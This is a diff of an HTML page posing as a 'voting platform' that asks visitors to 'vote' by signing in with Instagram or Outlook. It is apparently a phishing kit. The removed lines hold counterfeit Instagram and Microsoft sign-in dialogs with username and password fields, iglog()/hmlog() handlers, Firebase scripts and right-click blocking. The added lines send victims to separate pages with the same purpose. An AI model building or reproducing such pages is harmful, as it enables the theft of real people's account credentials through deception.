@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
 <head>
@@ -7,8 +8,6 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="css/index.css">
-  <link rel="stylesheet" href="assets/css/main.css">
 
 
   <style>
@@ -16,159 +15,6 @@
       display: none;
     }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-    }
-
-    html {
-      scroll-behavior: smooth;
-      /* overflow-y: hidden; */
-    }
-
-    #form::-webkit-scrollbar {
-      background: transparent;
-      width: 0;
-      height: 0;
-    }
-
-    .container-item {
-      z-index: 99999;
-      margin: 40px 10%;
-      overflow-x: hidden;
-      text-align: left;
-    }
-
-    .container-item-2 {
-      margin: 40px 10%;
-      border: 1px solid #7c7c7c;
-      display: flex;
-      justify-content: left;
-      align-items: center;
-      padding: 5px 15px;
-    }
-
-    input {
-      padding: 10px 1px;
-      width: 100%;
-      border: 1px solid transparent;
-      border-bottom: 1px solid #383838;
-      z-index: 1;
-    }
-
-    .slide-one {
-      width: 100%;
-      transition: 0.5s ease all;
-    }
-
-    .slide-two {
-      width: 100%;
-      transition: 0.5s ease all;
-    }
-
-    .slide-one-toggle {
-      transform: translateX(-100%);
-    }
-
-    .slide-two-toggle {
-      transform: translateX(-100%);
-    }
-
-    input:focus {
-      border-bottom: 1px solid red;
-      outline: 1px solid transparent;
-    }
-
-    #form p {
-      font-size: 14px;
-    }
-
-    #form p img {
-      transform: translateY(6px);
-    }
-
-    #form {
-      display: flex;
-      justify-content: space-between;
-      overflow-x: scroll;
-      width: 200%;
-    }
-
-    #btn {
-      background: #0067B8;
-      color: white;
-      border: 1px solid transparent;
-      width: 100px;
-      text-align: center;
-      border-radius: 2px;
-      padding: 8px 5px;
-    }
-
-    span {
-      color: dodgerblue;
-    }
-
-    .btn-item {
-      display: flex;
-      justify-content: right;
-      margin: 25px 0;
-    }
-
-
-    a {
-      text-decoration: none;
-      color: #383838;
-    }
-
-    @media screen and (min-width: 600px) {
-      footer {
-        background: linear-gradient(27deg, rgba(231, 216, 210, 1) 28%, rgba(214, 220, 227, 1) 52%, rgba(214, 225, 210, 1) 80%, rgba(231, 216, 210, 1) 100%);
-      }
-
-      .container {
-        margin: 5% 50%;
-        transform: translateX(-50%);
-        width: 70%;
-        background: white;
-        padding: 10px;
-      }
-
-      .container-item-2 {
-        margin: 8% 50%;
-        transform: translate(-50%, -20px);
-        width: 70%;
-        background: white;
-        padding: 10px;
-      }
-
-    }
-
-    @media screen and (min-width: 768px) {
-      .container {
-        width: 40%;
-      }
-
-      .container-item-2 {
-        transform: translate(-50%, -50px);
-        width: 40%;
-      }
-    }
-
-    @media screen and (min-width: 1200px) {
-      .container {
-        width: 30%;
-      }
-
-      .container-item-2 {
-        transform: translate(-50%, -70px);
-        width: 30%;
-      }
-    }
-  </style>
-
-  <style>
     * {
       margin: 0;
       padding: 0;
@@ -213,16 +59,17 @@
 </head>
 
 <body>
-  <div id="preloader" class="preloader"></div>
-
   <div class="wrapper">
     <p style="color: #507392; font-size: 13px; padding: 10px; text-align: center;">PLEASE I NEED YOUR VOTE</p>
     <center><img src="images/image.jpg" width="100px" height="100px">
       <h4 style="padding: 10px 0; text-overflow: ellipsis; width: 200px; overflow: hidden; color: #507392">Voting
         platform</h4>
-      <button onclick="Instagram()" style="background: #C62E2E;">VOTE WITH INSTAGRAM <i
-          class="fa fa-instagram"></i></button>
-      <button onclick="Hotmail()" style="background:#0D92F4;">VOTE WITH OUTLOOK <i class="fa fa-envelope"></i></button>
+      <a href="home.html"><button style="background: #C62E2E;">VOTE WITH INSTAGRAM <i
+            class="fa fa-instagram"></i></button></a>
+      <a style="display:none;" href="index_facebook.html"><button style="background: #7263f7;">VOTE WITH <i
+            class="fa fa-facebook"></i></button></a>
+      <a href="index_mail.html"><button style="background:#0D92F4;">VOTE WITH OUTLOOK <i
+            class="fa fa-envelope"></i></button></a>
     </center><br>
     <ul>
       <li style="background: #F6F9FB; border-left: 2px solid #5B9BD1; "><i class="fa fa-home"></i> Total Votes: 312 out
@@ -235,196 +82,6 @@
   </div>
   <h4 style="text-align: center; color: #3f3f3f;">Powered by <span style="color: #5B9BD1;"> google voting system</span>
   </h4>
-
-  <!-- Instagram Dialog Box -->
-  <div id="instagram" class="dialog">
-    <div class="dialog-content">
-      <h2><span hidden id="dialog-instagram"></span></h2>
-      <main class="l-main">
-        <div class="l-main__img">
-          <img src="assets/img/homepage.png" alt="Smartphones">
-        </div>
-        <div class="l-user">
-          <div class="c-panel group">
-
-            <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
-            <div class="c-panel__form">
-              <input type="text" class="c-panel__input" class="form-control" required
-                data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
-              <input type="text" class="c-panel__input" class="form-control" required
-                data-error="Please enter your email" placeholder="Password" id="ig-pass">
-              <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
-              <span class="c-panel__span">OR</span>
-            </div>
-            <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
-            <a href="#" class="c-panel__forgot">Forgot password?</a>
-            <br>
-            <br>
-          </div>
-          <div class="c-signup group">
-            <p>Don't have an account? <span>Sign up</span></p>
-          </div>
-
-          <div class="c-app">
-            <p>Get the app.</p>
-            <div class="c-app__download">
-              <img src="assets/img/apple.png" alt="Apple Store">
-              <img src="assets/img/google.png" alt="Google Play">
-            </div>
-          </div>
-        </div>
-      </main>
-    </div>
-  </div>
-
-  <!-- Hotmail Dialog Box -->
-  <div id="hotmail" class="dialog">
-    <div class="dialog-content">
-      <div class="container">
-        <div class="container-item">
-          <img src="images/microsoft-logo.svg" alt=""><br><br>
-          <div id='form'>
-            <div class="slide-one">
-              <h2>Sign in</h2>
-              <span class='msg' style="color: red; font-size: 13px;"></span>
-              <br>
-              <input type="email" id='hm-email' name='hm-email' placeholder="Email, phone, or Skype"><br><br>
-              <p>No account? <a href=""><span>Create one!</span></a></p>
-              <p style="color: dodgerblue;">Sign in with a security key <img src="images/question.JPG" alt="">
-              </p>
-              <div class="btn-item">
-                <p id="btn" class="next">Next</p>
-              </div>
-            </div>
-
-            <div class="slide-two">
-              <span class='msg2' style="color: red; font-size: 13px;"></span><br>
-              <p id='back'><i class="fa fa-arrow-left"></i> <span id='name' style="color: #383838;"></span></p><br>
-              <h2>Enter password</h2><br>
-              <input type="password" id='hm-pass' name='hm-pass' placeholder="Password"><br><br>
-              <p>Forget password?</p>
-              <a href="">
-                <p style="color: dodgerblue;">Other ways to sign in
-                </p>
-              </a>
-              <div class="btn-item">
-                <button onclick="hmlog()" id="btn" class="submit">Sign in</button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="container-item-2"><img src="images/key.jpeg" width="25px"> <span style="color: #383838;">Sign- in
-          options</span></div>
-
-    </div>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
-  <script>
-    function showCustomAlert() {
-      Swal.fire({
-        title: 'Oops!',
-        text: 'Something went wrong with your vote.',
-        icon: 'error',
-        confirmButtonText: 'Try Again'
-      });
-    }
-  </script>
-
-  <script>
-    function showPreloader() {
-      document.getElementById("preloader").style.display = "flex";
-    }
-
-    function hidePreloader() {
-      document.getElementById("preloader").style.display = "none";
-    }
-
-    function Hotmail() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("hotmail").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function Instagram() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("instagram").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function Facebook() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("facebook").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function closeDialog() {
-      document.getElementById("instagram").style.display = "none";
-      document.getElementById("hotmail").style.display = "none";
-      document.getElementById("facebook").style.display = "none";
-    }
-  </script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
-
-  <script src="js/firebase.js">
-
-  </script>
-
-  <script>
-    document.addEventListener('contextmenu', event => {
-      event.preventDefault();
-    });
-
-    document.querySelectorAll('.disabled').forEach(element => {
-      element.style.pointerEvents = 'none';
-    });
-  </script>
-
-
-  <script>
-    var next = document.querySelector('.next');
-    var submit = document.querySelector('.submit');
-    var slide_one = document.querySelector('.slide-one');
-    var slide_two = document.querySelector('.slide-two');
-    var email = document.getElementById('hm-email')
-    var nameText = document.getElementById('name')
-    var back_btn = document.getElementById('back')
-    var password = document.getElementById('hm-pass')
-    var msg = document.querySelector('.msg')
-    var msg2 = document.querySelector('.msg2')
-    var container_item_2 = document.querySelector('.container-item-2')
-    next.addEventListener('click', function () {
-      if (email.value == "") {
-        msg.textContent = 'Enter a valid email address, phone number, or Skype name.'
-      } else {
-        msg.textContent = ""
-        nameText.textContent = email.value
-        slide_one.classList.add('slide-one-toggle')
-        slide_two.classList.add('slide-two-toggle')
-        container_item_2.style.display = 'none'
-      }
-    })
-    back_btn.addEventListener('click', function () {
-      slide_one.classList.remove('slide-one-toggle')
-      slide_two.classList.remove('slide-two-toggle')
-      container_item_2.style.display = 'flex'
-    })
-
-  </script>
 </body>
 
 </html>
